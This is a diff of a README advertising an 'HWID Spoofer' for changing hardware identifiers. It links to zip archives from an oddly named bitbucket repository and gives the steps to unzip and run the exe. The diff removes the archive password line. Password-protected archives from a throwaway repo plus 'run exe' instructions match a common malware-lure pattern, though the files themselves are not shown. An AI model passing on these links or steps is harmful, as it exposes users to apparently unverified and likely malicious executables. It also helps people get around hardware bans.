@@ -8,11 +8,10 @@ Equipped with sophisticated algorithms, HWID Spoofer can effectively modify hard
 > [!Note]
 > ## Hwid Spoofer x32 - [Click To Download](https://bitbucket.org/gitfilesprojecct/gitfiles/downloads/Spoofer_Setup_x32.zip)
 > ## Hwid Spoofer x64 - [Click To Download](https://bitbucket.org/gitfilesprojecct/gitfiles/downloads/Spoofer_Setup_x64.zip)
-> ## Archive Password: soft2025
 
 ## Instructions
 1. Download the archive
-2. Unzip to any folder (pass: soft2025)
+2. Unzip to any folder 
 3. Run exe
 4. Enjoy
 
